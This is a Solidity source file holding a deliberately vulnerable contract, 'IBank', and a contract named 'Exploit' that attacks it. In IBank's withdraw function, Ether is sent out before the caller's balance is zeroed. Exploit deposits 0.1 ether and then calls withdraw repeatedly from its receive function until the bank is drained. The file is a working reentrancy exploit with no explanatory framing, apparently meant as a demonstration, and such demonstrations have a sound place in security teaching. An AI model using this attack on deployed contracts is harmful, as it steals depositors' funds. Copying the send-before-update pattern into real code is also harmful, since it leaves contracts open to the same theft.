pragma solidity 0.8.19;

import "@openzeppelin/contracts/utils/Address.sol";

contract IBank {
    using Address for address payable;

    mapping(address => uint256) private _balances;

    function balanceOf(address user) external view returns (uint256) {
        return _balances[user];
    }

    function deposit() external payable {
        _balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 balance = _balances[msg.sender];
        payable(msg.sender).sendValue(balance);
        _balances[msg.sender] = 0;
    }
}


contract Exploit {
    IBank ibank;
    constructor(address bankAddress) payable {
        ibank = IBank(bankAddress);
    }

    function attack() external {
        ibank.deposit{value: 0.1 ether}();
        ibank.withdraw();
    }
    
    receive() external payable {
        if(address(ibank).balance >= 0.1 ether) {
            ibank.withdraw();        
        }

    }
}